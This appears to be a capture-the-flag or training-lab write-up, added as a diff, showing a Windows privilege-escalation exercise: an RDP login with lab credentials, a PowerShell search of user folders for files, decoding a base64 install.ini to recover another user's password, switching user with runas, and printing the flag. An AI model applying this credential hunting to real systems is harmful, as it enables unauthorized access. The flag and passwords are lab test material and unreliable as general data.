@@ -1,0 +1,34 @@
+Questions 3
+Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin! and locate sensitive information on the system to elevate your privileges. Once found, use the credentials to access the system as this user and find the flag on the Desktop.
+
+HINT
+Use the command provided in Listing 18 (16.1.3) to search for files in C:\users directory.
+Decode the content of the file you have found.
+Use runas command as shown in Figure 3 to connect with the new credentials
+
+xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.192.221
+
+# Open Powershell 
+PS C:\Users\mac> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.ini,*.xslx,*.csv,*.word,*.rtf -File -Recurse -ErrorAction SilentlyContinue
+Directory: C:\Users\Public\Documents
+11/15/2022   8:56 AM            376 install.ini
+
+PS C:\Users\mac> type C:\Users\Public\Documents\install.ini
+# They don't know anything about computers!!
+
+ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAIAB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA==
+
+# Use Cyberchef with "From Base64" and "Remove null bytes" recipe
+{
+  "boolean": true,
+  "admin": false,
+  "user": {
+    "name": "richmond",
+    "pass": "GothicLifeStyle1337!"
+  }
+}
+
+runas /user:richmond cmd
+C:\Windows\system32>powershell
+PS C:\Users\richmond\Desktop> type flag.txt
+OS{fa6497b436dbb4e22ec66b48714792c0}
